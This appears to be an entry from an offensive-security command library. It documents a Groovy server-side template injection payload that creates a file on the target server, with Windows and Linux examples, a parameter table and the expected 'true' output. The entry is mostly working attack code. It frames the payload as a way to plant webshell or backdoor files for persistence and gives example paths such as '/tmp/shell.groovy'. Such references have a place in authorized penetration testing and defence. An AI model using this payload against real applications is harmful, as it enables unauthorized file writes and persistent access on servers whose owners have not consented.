---
type: command
executor: groovy
data: '${new File("$_FILE_PATH").createNewFile();}'
output: null
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Java
  - Web
tags:
  - ssti
  - file-create
  - groovy
verified: true
validated: true
---

# groovy-create-new-file

## Command

```groovy
${new File("$_FILE_PATH").createNewFile();}
```

## Description

This Groovy expression creates a new empty file at the specified path via SSTI injection. It returns a boolean indicating success and can be used to establish persistence by creating webshell files or modifying directories.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_FILE_PATH | Full path and filename for the new file (e.g., 'C:/Temp/backdoor.txt' or '/tmp/shell.groovy') | Yes |

## Examples

### Basic Usage on Windows

```groovy
${new File("C:\Temp\FileName.txt").createNewFile();}
```

### Linux Usage

```groovy
${new File("/tmp/malicious.txt").createNewFile();}
```

## Expected Output

A boolean 'true' rendered in the response if the file was created successfully, e.g.,

```
true
```

Errors like 'Permission denied' appear if the directory is protected.

## Related

- [[procedures/Server-Side-Template-Injection-Groovy-File-Manipulation]]
- [[commands/groovy-read-file-text]]
